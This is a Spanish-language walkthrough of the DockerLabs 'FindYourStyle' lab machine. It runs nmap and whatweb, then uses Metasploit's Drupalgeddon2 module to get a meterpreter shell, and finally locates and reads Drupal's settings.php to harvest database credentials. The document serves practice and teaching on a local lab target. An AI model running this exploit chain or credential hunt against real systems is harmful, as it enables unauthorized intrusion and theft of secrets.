Maquinas que vamos a utilizar **Kali Linux y FindYourStyle** [DockerLabs](https://dockerlabs.es/)

  

Descargar en ele escritorio de Kali. Descomprimimos el archivo y en un terminal escribimos el siguiente comando para desplegar la maquina en Docker.

```Bash
sudo bash auto_deploy.sh findyourstyle.tar
```

![[Imagenes/image 54.png|image 54.png]]

  

```Bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 172.17.0.2 
```

![[Imagenes/image 1 43.png|image 1 43.png]]

  

- Nos vamos en el navegador y ponemos la IP para ver el puerto 80 en el navegador web
    
    ![[Imagenes/image 2 42.png|image 2 42.png]]
    

  

- Usamos la **herramienta whatweb** para ver que tecnologías utiliza la web.
    
    ```Bash
    whatweb http://172.17.0.2/  
    ```
    
    ![[Imagenes/image 3 41.png|image 3 41.png]]
    

  

- Lanzamos el Metasploit
    
    ![[Imagenes/image 4 39.png|image 4 39.png]]
    
      
    
    `search drupal 8`
    
    ![[Imagenes/image 5 38.png|image 5 38.png]]
    

`use exploit/unix/webapp/drupal_drupalgeddon2`

![[Imagenes/image 6 36.png|image 6 36.png]]

`show options`

![[Imagenes/image 7 34.png|image 7 34.png]]

Completamos los datos que nos falten.

`set RHOSTS 172.17.0.2`

`show options`

![[Imagenes/image 8 32.png|image 8 32.png]]

  

`run`

![[Imagenes/image 9 29.png|image 9 29.png]]

Ya tenemos una sesión de meterpreter

- Lanzamos una sesion de shell
    
    `shell`
    
    ![[Imagenes/image 10 25.png|image 10 25.png]]
    
      
    
- Vamos a buscar el archivo **settings.php.**
    
    > [!important] El archivo **settings.php** en Drupal **es crucial** para la configuración del sitio. Se encuentra en la carpeta `sites/default` y almacena información clave, como la conexión a la base de datos, el nombre de la base de datos, el usuario y la contraseña
    
      
    
    `find / -name settings.php 2>/dev/null`
    
    ![[Imagenes/image 11 19.png|image 11 19.png]]
    
      
    
    > [!important] `find /`: Busca en todo el sistema desde la raíz (`/`).
    > 
    > `name settings.php`: Filtra la búsqueda para encontrar archivos que coincidan exactamente con el nombre `settings.php`.
    > 
    > `2>/dev/null`: Redirige los mensajes de error generados por la búsqueda (por ejemplo, por falta de permisos) al vacío (`/dev/null`), evitando que aparezcan en la salida.
    
      
    
- Vamos a ver el contenido del archivo **settings.php**
    
    `cat /var/www/html/sites/default/settings.php`
    
    ![[Imagenes/image 12 19.png|image 12 19.png]]
    
      
    
    Aquí intentaremos encontrar contraseñas, usuarios , etc…
    
    ![[Imagenes/image 13 18.png|image 13 18.png]]
    
    ![[Imagenes/image 14 16.png|image 14 16.png]]